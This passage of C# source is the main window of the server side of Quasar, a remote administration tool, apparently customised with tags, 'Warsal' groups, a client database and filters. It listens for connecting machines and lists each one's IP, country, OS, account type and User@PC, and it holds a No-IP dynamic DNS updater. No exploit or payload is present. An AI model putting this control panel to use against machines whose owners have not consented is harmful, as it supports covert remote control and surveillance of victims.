using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Server.Extensions;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }

        /* Column order:
         * Uuid(0), Status(1), Accept Ping(2), Install(3), Last ping(4), Version(5),
         * Country(6), IP Address(7), OS(8), Warsal(9), Tag(10), Account Type(11), User@PC(12) */
        private const int UUID_ID = 0;
        private const int STATUS_ID = 1;
        private const int ACCEPT_PING_ID = 2;
        private const int INSTALL_TIME_ID = 3;
        private const int LAST_PING_TIME_ID = 4;
        private const int IP_ADDRESS_ID = 7;
        private const int WARSAL_ID = 9;
        private const int TAG_ID = 10;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly ClientPingRequestHandler _clientPingHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview
        private readonly ClientDatabase _clientDb;
        private volatile int _loadingDbRows;
        private ToolStripMenuItem _tagsMenuStripItem;
        private ToolStripMenuItem _manageTagsMenuItem;
        private ToolStripMenuItem _setTagToolStripMenuItem;
        private ToolStripMenuItem _warsalMenuStripItem;
        private ToolStripMenuItem _manageWarsalsMenuItem;
        private ToolStripMenuItem _setWarsalToolStripMenuItem;
        private readonly Dictionary<string, Color> _tagBackColors = new Dictionary<string, Color>(StringComparer.OrdinalIgnoreCase);
        private Panel _clientAreaPanel;
        private Panel _filterPanel;
        private TextBox _txtFilterSearch;
        private ComboBox _cmbOnlineFilter;
        private ComboBox _cmbTagFilter;
        private ComboBox _cmbWarsalFilter;
        private ToolStripStatusLabel _countsStatusLabel;
        private ToolStripStatusLabel _filteredStatusLabel;
        private ToolStripStatusLabel _statusSpacer;

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _clientPingHandler = new ClientPingRequestHandler();
            RegisterMessageHandler();
            InitializeComponent();
            _clientDb = new ClientDatabase();
            lstClients.OwnerDraw = true;
            lstClients.DrawColumnHeader += lstClients_DrawColumnHeader;
            lstClients.DrawItem += lstClients_DrawItem;
            lstClients.DrawSubItem += lstClients_DrawSubItem;
            lstClients.MouseUp += lstClients_MouseUp;
            InitializeFilterUi();
            InitializeTagMenus();
            InitializeWarsalMenus();
        }

        /// <summary>
        /// Registers the client status message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;

            MessageHandler.Register(_clientPingHandler);
            _clientPingHandler.PingReceived += SetPingByClient;
        }

        /// <summary>
        /// Unregisters the client status message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;

            MessageHandler.Unregister(_clientPingHandler);
            _clientPingHandler.PingReceived -= SetPingByClient;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeTagMenus()
        {
            _tagsMenuStripItem = new ToolStripMenuItem("Tag");
            _manageTagsMenuItem = new ToolStripMenuItem("Manage Tags...");
            _manageTagsMenuItem.Click += manageTagsMenuItem_Click;
            _tagsMenuStripItem.DropDownItems.Add(_manageTagsMenuItem);
            menuStrip.Items.Insert(2, _tagsMenuStripItem);

            _setTagToolStripMenuItem = new ToolStripMenuItem("Set Tag");
            _setTagToolStripMenuItem.DropDownOpening += setTagToolStripMenuItem_DropDownOpening;
            int clientMgmtIdx = contextMenuStrip.Items.IndexOf(connectionToolStripMenuItem);
            if (clientMgmtIdx >= 0)
                contextMenuStrip.Items.Insert(clientMgmtIdx + 1, _setTagToolStripMenuItem);
            else
                contextMenuStrip.Items.Add(_setTagToolStripMenuItem);
        }

        private void InitializeWarsalMenus()
        {
            _warsalMenuStripItem = new ToolStripMenuItem("Warsal");
            _manageWarsalsMenuItem = new ToolStripMenuItem("Manage Warsals...");
            _manageWarsalsMenuItem.Click += manageWarsalsMenuItem_Click;
            _warsalMenuStripItem.DropDownItems.Add(_manageWarsalsMenuItem);
            menuStrip.Items.Insert(3, _warsalMenuStripItem);

            _setWarsalToolStripMenuItem = new ToolStripMenuItem("Set Warsal");
            _setWarsalToolStripMenuItem.Click += setWarsalToolStripMenuItem_Click;
            int clientMgmtIdx = contextMenuStrip.Items.IndexOf(connectionToolStripMenuItem);
            if (clientMgmtIdx >= 0)
                contextMenuStrip.Items.Insert(clientMgmtIdx + 2, _setWarsalToolStripMenuItem);
            else
                contextMenuStrip.Items.Add(_setWarsalToolStripMenuItem);
        }

        private void manageWarsalsMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmManageWarsals(_clientDb, () =>
            {
                RefreshAllWarsalCellsFromDb();
                RefreshWarsalFilterOptions();
                ApplyFilters(reloadFromDb: false);
            }))
                frm.ShowDialog(this);
        }

        private void setWarsalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var uuids = new List<string>();
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                if (lvi?.SubItems == null || lvi.SubItems.Count <= UUID_ID) continue;
                var u = lvi.SubItems[UUID_ID].Text?.Trim();
                if (!string.IsNullOrEmpty(u)) uuids.Add(u);
            }
            if (uuids.Count == 0) return;

            using (var frm = new FrmSetClientWarsals(_clientDb, uuids, () =>
            {
                foreach (var u in uuids)
                    RefreshWarsalCellForUuid(u);
                ApplyFilters(reloadFromDb: false);
            }))
                frm.ShowDialog(this);
        }

        private void RefreshWarsalCellForUuid(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var lvi = GetListViewItemByUuid(uuid);
                    if (lvi != null && lvi.SubItems.Count > WARSAL_ID)
                        lvi.SubItems[WARSAL_ID].Text = _clientDb.GetClientWarsalDisplayString(uuid);
                    lstClients.Invalidate();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void RefreshAllWarsalCellsFromDb()
        {
            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items)
                        {
                            if (lvi == null || lvi.SubItems.Count <= WARSAL_ID) continue;
                            string uuid = lvi.SubItems[UUID_ID].Text?.Trim() ?? "";
                            if (uuid.Length == 0) continue;
                            lvi.SubItems[WARSAL_ID].Text = _clientDb.GetClientWarsalDisplayString(uuid);
                        }
                    }
                    lstClients.Invalidate();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void InitializeFilterUi()
        {
            _clientAreaPanel = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0) };
            _filterPanel = new Panel { Dock = DockStyle.Top, Height = 32, Padding = new Padding(6, 4, 6, 4) };

            _txtFilterSearch = new TextBox { Left = 6, Top = 5, Width = 320, Anchor = AnchorStyles.Left | AnchorStyles.Top };
            _txtFilterSearch.TextChanged += FilterControls_Changed;

            _cmbOnlineFilter = new ComboBox
            {
                Left = 334,
                Top = 5,
                Width = 120,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            _cmbOnlineFilter.Items.AddRange(new object[] { "All", "Online", "Offline" });
            _cmbOnlineFilter.SelectedIndex = 0;
            _cmbOnlineFilter.SelectedIndexChanged += FilterControls_Changed;

            _cmbTagFilter = new ComboBox
            {
                Left = 462,
                Top = 5,
                Width = 170,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            _cmbTagFilter.SelectedIndexChanged += FilterControls_Changed;

            _cmbWarsalFilter = new ComboBox
            {
                Left = 640,
                Top = 5,
                Width = 170,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            _cmbWarsalFilter.SelectedIndexChanged += FilterControls_Changed;

            _filterPanel.Controls.Add(_txtFilterSearch);
            _filterPanel.Controls.Add(_cmbOnlineFilter);
            _filterPanel.Controls.Add(_cmbTagFilter);
            _filterPanel.Controls.Add(_cmbWarsalFilter);

            tableLayoutPanel.Controls.Remove(lstClients);
            lstClients.Dock = DockStyle.Fill;
            _clientAreaPanel.Controls.Add(lstClients);
            _clientAreaPanel.Controls.Add(_filterPanel);
            tableLayoutPanel.Controls.Add(_clientAreaPanel, 0, 1);

            _countsStatusLabel = new ToolStripStatusLabel("Total: 0 | Online: 0 | Offline: 0");
            _statusSpacer = new ToolStripStatusLabel { Spring = true };
            _filteredStatusLabel = new ToolStripStatusLabel("Filtered: 0");
            statusStrip.Items.Add(_countsStatusLabel);
            statusStrip.Items.Add(_statusSpacer);
            statusStrip.Items.Add(_filteredStatusLabel);

            RefreshTagFilterOptions();
            RefreshWarsalFilterOptions();
        }

        private void RefreshTagFilterOptions()
        {
            if (_cmbTagFilter == null) return;

            string selected = _cmbTagFilter.SelectedItem as string ?? "All";
            _cmbTagFilter.BeginUpdate();
            _cmbTagFilter.Items.Clear();
            _cmbTagFilter.Items.Add("All");
            foreach (var tag in _clientDb.LoadAllTags())
            {
                if (!string.IsNullOrWhiteSpace(tag.Name))
                    _cmbTagFilter.Items.Add(tag.Name.Trim());
            }
            int idx = _cmbTagFilter.FindStringExact(selected);
            _cmbTagFilter.SelectedIndex = idx >= 0 ? idx : 0;
            _cmbTagFilter.EndUpdate();
        }

        private void RefreshWarsalFilterOptions()
        {
            if (_cmbWarsalFilter == null) return;

            string selected = _cmbWarsalFilter.SelectedItem as string ?? "All";
            _cmbWarsalFilter.BeginUpdate();
            _cmbWarsalFilter.Items.Clear();
            _cmbWarsalFilter.Items.Add("All");
            foreach (var name in _clientDb.LoadAllWarsalNames())
            {
                if (!string.IsNullOrWhiteSpace(name))
                    _cmbWarsalFilter.Items.Add(name.Trim());
            }
            int idx = _cmbWarsalFilter.FindStringExact(selected);
            _cmbWarsalFilter.SelectedIndex = idx >= 0 ? idx : 0;
            _cmbWarsalFilter.EndUpdate();
        }

        /// <summary>True if the warsal cell (comma-separated) contains the given warsal name.</summary>
        private static bool ClientRowHasWarsalFilter(string warsalCellText, string filterWarsalName)
        {
            if (string.IsNullOrWhiteSpace(filterWarsalName) ||
                string.Equals(filterWarsalName, "All", StringComparison.OrdinalIgnoreCase))
                return true;
            if (string.IsNullOrWhiteSpace(warsalCellText)) return false;
            foreach (var part in warsalCellText.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries))
            {
                if (string.Equals(part.Trim(), filterWarsalName.Trim(), StringComparison.OrdinalIgnoreCase))
                    return true;
            }
            return false;
        }

        private void FilterControls_Changed(object sender, EventArgs e)
        {
            ApplyFilters(reloadFromDb: true);
        }

        private void ApplyFilters(bool reloadFromDb)
        {
            if (reloadFromDb) LoadClientsFromDatabase();

            string term = (_txtFilterSearch?.Text ?? "").Trim();
            string termLower = term.ToLowerInvariant();
            string onlineFilter = _cmbOnlineFilter?.SelectedItem as string ?? "All";
            string tagFilter = _cmbTagFilter?.SelectedItem as string ?? "All";
            string warsalFilter = _cmbWarsalFilter?.SelectedItem as string ?? "All";

            var toRemove = new List<ListViewItem>();
            foreach (ListViewItem item in lstClients.Items)
            {
                bool keep = true;
                if (item == null || item.SubItems.Count <= TAG_ID) keep = false;
                if (!keep) { toRemove.Add(item); continue; }

                string uuid = item.SubItems[UUID_ID].Text ?? "";
                string status = item.SubItems[STATUS_ID].Text ?? "";
                string version = item.SubItems[5].Text ?? "";
                string country = item.SubItems[6].Text ?? "";
                string ip = item.SubItems[IP_ADDRESS_ID].Text ?? "";
                string os = item.SubItems[8].Text ?? "";
                string warsal = item.SubItems.Count > WARSAL_ID ? (item.SubItems[WARSAL_ID].Text ?? "") : "";
                string tag = item.SubItems[TAG_ID].Text ?? "";

                if (termLower.Length > 0)
                {
                    var hay = (uuid + " " + version + " " + country + " " + ip + " " + os + " " + warsal + " " + tag).ToLowerInvariant();
                    if (!hay.Contains(termLower)) keep = false;
                }

                if (keep && string.Equals(onlineFilter, "Online", StringComparison.OrdinalIgnoreCase))
                    keep = string.Equals(status, "Connected", StringComparison.OrdinalIgnoreCase);
                else if (keep && string.Equals(onlineFilter, "Offline", StringComparison.OrdinalIgnoreCase))
                    keep = !string.Equals(status, "Connected", StringComparison.OrdinalIgnoreCase);

                if (keep && !string.Equals(tagFilter, "All", StringComparison.OrdinalIgnoreCase))
                    keep = string.Equals(tag, tagFilter, StringComparison.OrdinalIgnoreCase);

                if (keep && !string.Equals(warsalFilter, "All", StringComparison.OrdinalIgnoreCase))
                    keep = ClientRowHasWarsalFilter(warsal, warsalFilter);

                if (!keep) toRemove.Add(item);
            }

            foreach (var item in toRemove) lstClients.Items.Remove(item);

            UpdateStatusCounts();
            lstClients.Invalidate();
        }

        private void UpdateStatusCounts()
        {
            try
            {
                var rows = _clientDb.LoadAllClients();
                int total = rows.Count;
                int online = rows.Count(r => string.Equals(r.Status, "Connected", StringComparison.OrdinalIgnoreCase));
                int offline = total - online;

                if (_countsStatusLabel != null)
                    _countsStatusLabel.Text = $"Total: {total} | Online: {online} | Offline: {offline}";
                if (_filteredStatusLabel != null)
                {
                    string term = (_txtFilterSearch?.Text ?? "").Trim();
                    _filteredStatusLabel.Text = term.Length == 0
                        ? $"Filtered: {lstClients.Items.Count}"
                        : $"Filtered ({term}): {lstClients.Items.Count}";
                }
            }
            catch
            {
            }
        }

        private void setTagToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
        {
            _setTagToolStripMenuItem.DropDownItems.Clear();
            var tags = _clientDb.LoadAllTags();
            if (tags.Count == 0)
            {
                var emptyItem = new ToolStripMenuItem("(Empty)") { Enabled = false };
                _setTagToolStripMenuItem.DropDownItems.Add(emptyItem);
                return;
            }

            foreach (var tag in tags)
            {
                var item = new ToolStripMenuItem(tag.Name) { Tag = tag.Name };
                item.Click += setTagValueItem_Click;
                _setTagToolStripMenuItem.DropDownItems.Add(item);
            }
        }

        private void setTagValueItem_Click(object sender, EventArgs e)
        {
            var item = sender as ToolStripMenuItem;
            string tagName = item?.Tag as string ?? "";
            if (string.IsNullOrWhiteSpace(tagName)) return;

            var selectedClients = GetSelectedClients();
            foreach (var client in selectedClients)
            {
                if (client?.Value != null) client.Value.Tag = tagName;
            }

            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                if (lvi == null || lvi.SubItems.Count <= UUID_ID || lvi.SubItems.Count <= TAG_ID) continue;
                string uuid = lvi.SubItems[UUID_ID].Text;
                if (string.IsNullOrWhiteSpace(uuid)) continue;
                _clientDb.SetClientTag(uuid, tagName);
                lvi.SubItems[TAG_ID].Text = tagName;
            }

            RefreshTagFilterOptions();
            lstClients.Invalidate();
            UpdateStatusCounts();
        }

        private void manageTagsMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmManageTags(_clientDb, () =>
            {
                RefreshTagColorsCache();
                RefreshTagFilterOptions();
                ApplyFilters(reloadFromDb: true);
                lstClients.Invalidate();
            }))
            {
                frm.ShowDialog(this);
            }
        }

        private void RefreshTagColorsCache()
        {
            _tagBackColors.Clear();
            foreach (var tag in _clientDb.LoadAllTags())
            {
                if (string.IsNullOrWhiteSpace(tag.Name) || string.IsNullOrWhiteSpace(tag.Color))
                    continue;
                if (TryParseHtmlColor(tag.Color, out var c))
                    _tagBackColors[tag.Name.Trim()] = c;
            }
        }

        private static bool TryParseHtmlColor(string value, out Color color)
        {
            color = Color.Empty;
            try
            {
                color = ColorTranslator.FromHtml((value ?? "").Trim());
                return color.A > 0 || color == Color.Black || color == Color.White;
            }
            catch
            {
                return false;
            }
        }

        private static Color GetReadableTextColor(Color background)
        {
            double luminance = (0.299 * background.R) + (0.587 * background.G) + (0.114 * background.B);
            return luminance < 140 ? Color.White : Color.Black;
        }

        private bool TryGetRowTagBackColor(ListViewItem item, out Color color)
        {
            color = Color.Empty;
            if (item == null || item.SubItems.Count <= TAG_ID) return false;
            string tagName = (item.SubItems[TAG_ID].Text ?? "").Trim();
            if (tagName.Length == 0) return false;
            return _tagBackColors.TryGetValue(tagName, out color);
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));

            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;

            var result = serverCsp.ExportParameters(false);
            var result2 = connectedCsp.ExportParameters(false);

            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/

            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Viewer - Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, string.Format("Socket error: {0}\nError Code: {1}", ex.Message, ex.ErrorCode), "Viewer - Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Failed to start listener: " + ex.Message, "Viewer - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            _clientDb.Initialize();
            _clientDb.SetAllClientsDisconnected();
            RefreshTagColorsCache();
            RefreshTagFilterOptions();
            RefreshWarsalFilterOptions();
            LoadClientsFromDatabase();
            AutostartListening();
        }

        private void lstClients_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.Graphics.FillRectangle(SystemBrushes.Control, e.Bounds);
            ControlPaint.DrawBorder3D(e.Graphics, e.Bounds, Border3DStyle.RaisedInner);
            TextRenderer.DrawText(
                e.Graphics,
                e.Header.Text,
                e.Font,
                e.Bounds,
                SystemColors.ControlText,
                TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
        }

        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            /* In Details view, we draw per-subitem (so Accept Ping can be custom). */
            if (lstClients.View == View.Details)
            {
                // Background is handled by DrawSubItem.
                return;
            }
            e.DrawDefault = true;
        }

        private void lstClients_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            bool selected = (e.ItemState & ListViewItemStates.Selected) != 0;
            Color rowBack = SystemColors.Window;
            if (!selected && TryGetRowTagBackColor(e.Item, out var tagBack))
                rowBack = tagBack;
            Color rowFore = selected ? SystemColors.HighlightText : GetReadableTextColor(rowBack);
            if (selected)
            {
                e.Graphics.FillRectangle(SystemBrushes.Highlight, e.Bounds);
            }
            else
            {
                using (var bgBrush = new SolidBrush(rowBack))
                    e.Graphics.FillRectangle(bgBrush, e.Bounds);
            }

            if (e.ColumnIndex == STATUS_ID)
            {
                var oldSmooth = e.Graphics.SmoothingMode;
                e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

                bool connected = string.Equals(e.SubItem?.Text, "Connected", StringComparison.OrdinalIgnoreCase);
                Color fill = connected ? Color.FromArgb(46, 204, 64) : Color.FromArgb(220, 53, 69);
                Color border = connected ? Color.FromArgb(30, 150, 40) : Color.FromArgb(170, 40, 50);

                const int dotSize = 10;
                int cx = e.Bounds.Left + (e.Bounds.Width - dotSize) / 2;
                int cy = e.Bounds.Top + (e.Bounds.Height - dotSize) / 2;
                var dotRect = new Rectangle(cx, cy, dotSize, dotSize);

                using (var fb = new SolidBrush(fill))
                    e.Graphics.FillEllipse(fb, dotRect);
                using (var bp = new Pen(border, 1.2f))
                    e.Graphics.DrawEllipse(bp, dotRect);

                e.Graphics.SmoothingMode = oldSmooth;
                return;
            }

            if (e.ColumnIndex == ACCEPT_PING_ID)
            {
                bool accept = false;
                if (e.SubItem?.Tag is bool b) accept = b;

                const int cb = 13;
                int cbx = e.Bounds.Left + (e.Bounds.Width - cb) / 2;
                int cby = e.Bounds.Top + (e.Bounds.Height - cb) / 2;
                var cbState = accept ? ButtonState.Checked : ButtonState.Normal;
                ControlPaint.DrawCheckBox(e.Graphics, new Rectangle(cbx, cby, cb, cb), cbState);
                return;
            }

            if (e.ColumnIndex == IP_ADDRESS_ID)
            {
                string ipText = (e.SubItem?.Text ?? "").TrimStart();
                Image flagImg = null;
                if (e.SubItem?.Tag is int imgIdx && imgIdx >= 0 && imgIdx < imgFlags.Images.Count)
                    flagImg = imgFlags.Images[imgIdx];

                int totalW = 0;
                int flagW = 0;
                const int gap = 3;
                if (flagImg != null) { flagW = flagImg.Width; totalW += flagW + gap; }
                var textSize = TextRenderer.MeasureText(ipText, e.SubItem.Font);
                totalW += textSize.Width;

                int startX = e.Bounds.Left + (e.Bounds.Width - totalW) / 2;
                if (startX < e.Bounds.Left + 2) startX = e.Bounds.Left + 2;

                if (flagImg != null)
                {
                    int iy = e.Bounds.Top + (e.Bounds.Height - flagImg.Height) / 2;
                    e.Graphics.DrawImage(flagImg, startX, iy);
                    startX += flagW + gap;
                }

                TextRenderer.DrawText(
                    e.Graphics, ipText, e.SubItem.Font,
                    new Rectangle(startX, e.Bounds.Top, e.Bounds.Right - startX, e.Bounds.Height),
                    rowFore,
                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
                return;
            }

            TextRenderer.DrawText(
                e.Graphics,
                e.SubItem?.Text ?? "",
                e.SubItem.Font,
                e.Bounds,
                rowFore,
                TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
        }

        private void lstClients_MouseUp(object sender, MouseEventArgs e)
        {
            if (_loadingDbRows != 0) return;
            var hit = lstClients.HitTest(e.Location);
            if (hit?.Item == null) return;

            /* Determine which column was clicked by comparing X against column boundaries. */
            int x = e.Location.X;
            int col = 0;
            int left = 0;
            foreach (ColumnHeader ch in lstClients.Columns)
            {
                int right = left + ch.Width;
                if (x >= left && x < right) { break; }
                left = right;
                col++;
            }
            if (col != ACCEPT_PING_ID) return;

            var item = hit.Item;
            if (item.SubItems.Count <= UUID_ID || item.SubItems.Count <= ACCEPT_PING_ID) return;
            var uuid = item.SubItems[UUID_ID].Text;
            if (string.IsNullOrWhiteSpace(uuid)) return;

            bool current = item.SubItems[ACCEPT_PING_ID].Tag is bool b && b;
            bool next = !current;
            item.SubItems[ACCEPT_PING_ID].Tag = next;
            _clientDb.SetClientAcceptPing(uuid, next);

            lstClients.Invalidate(item.SubItems[ACCEPT_PING_ID].Bounds);
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                string uuid = client.Value.Id;
                string status = "Connected";
                string userStatus = "Active";
                string serverTag = _clientDb.GetClientTag(uuid);
                if (string.IsNullOrWhiteSpace(serverTag))
                    serverTag = client.Value.Tag ?? "";
                client.Value.Tag = serverTag;
                string warsalDisplay = _clientDb.GetClientWarsalDisplayString(uuid);

                var row = _clientDb.UpsertClientBasics(
                    uuid,
                    client.EndPoint.Address.ToString(),
                    serverTag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    status,
                    userStatus,
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);

                var lviExisting = GetListViewItemByUuid(uuid);
                if (lviExisting != null)
                {
                    lviExisting.Tag = client;
                    lviExisting.ImageIndex = -1;
                    lviExisting.SubItems[0].Text = uuid;
                    lviExisting.SubItems[1].Text = status;
                    lviExisting.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
                    lviExisting.SubItems[3].Text = FormatNullableUtc(row.InstallTimeUtc);
                    lviExisting.SubItems[4].Text = FormatNullableUtc(row.LastPingTimeUtc);
                    lviExisting.SubItems[5].Text = client.Value.Version;
                    lviExisting.SubItems[6].Text = client.Value.CountryWithCode;
                    lviExisting.SubItems[IP_ADDRESS_ID].Text = " " + client.EndPoint.Address;
                    lviExisting.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;
                    lviExisting.SubItems[8].Text = client.Value.OperatingSystem;
                    lviExisting.SubItems[WARSAL_ID].Text = warsalDisplay;
                    lviExisting.SubItems[TAG_ID].Text = serverTag;
                    lviExisting.SubItems[11].Text = client.Value.AccountType;
                    lviExisting.SubItems[12].Text = client.Value.UserAtPc;
                }
                else
                {
                    // Keep order aligned with FrmMain.Designer.cs column order.
                    ListViewItem lvi = new ListViewItem(new string[]
                    {
                        uuid,                          // Uuid
                        status,                       // Status
                        "",                           // Accept Ping (checkbox)
                        FormatNullableUtc(row.InstallTimeUtc), // Install Time
                        FormatNullableUtc(row.LastPingTimeUtc), // Last Ping
                        client.Value.Version,         // Version
                        client.Value.CountryWithCode, // Country
                        " " + client.EndPoint.Address, // IP Address
                        client.Value.OperatingSystem, // OS
                        warsalDisplay,                // Warsal
                        serverTag,                    // Tag
                        client.Value.AccountType,     // Account Type
                        client.Value.UserAtPc         // User@PC
                    }) { Tag = client, ImageIndex = -1 };
                    lvi.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
                    lvi.SubItems[IP_ADDRESS_ID].Tag = client.Value.ImageIndex;

                    lstClients.Invoke((MethodInvoker) delegate
                    {
                        lock (_lockClients)
                        {
                            lstClients.Items.Add(lvi);
                        }
                    });
                }

                UpdateWindowTitle();
                ApplyFilters(reloadFromDb: false);
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Marks a disconnected client row (does not remove historical rows).
        /// </summary>
